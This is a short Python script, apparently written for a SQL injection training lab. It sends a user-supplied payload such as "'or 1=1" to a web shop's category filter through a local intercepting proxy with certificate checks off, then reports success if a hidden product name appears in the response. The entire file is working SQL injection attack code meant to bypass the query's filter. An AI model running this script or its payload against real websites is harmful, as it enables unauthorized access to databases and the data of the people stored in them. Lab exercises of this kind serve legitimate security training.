import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    url = url.rstrip('/') # remove trailing slash
    path = '/filter?category='
    uri = url + path + payload
    res = requests.get(uri, verify=False, proxies=proxies)
    
    if res.status_code >= 400:
        print('Something went wrong. Check your URL or Payload')
        return False
    if "Cheshire Cat Grin" in res.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] Usage: %s http://example.com "\'or 1=1"' % sys.argv[0])
        sys.exit(-1)
    
    if exploit_sqli(url, payload):
        print('[+] SQL Injection successfull.')
    else:
        print('[-] SQL Injection failed!')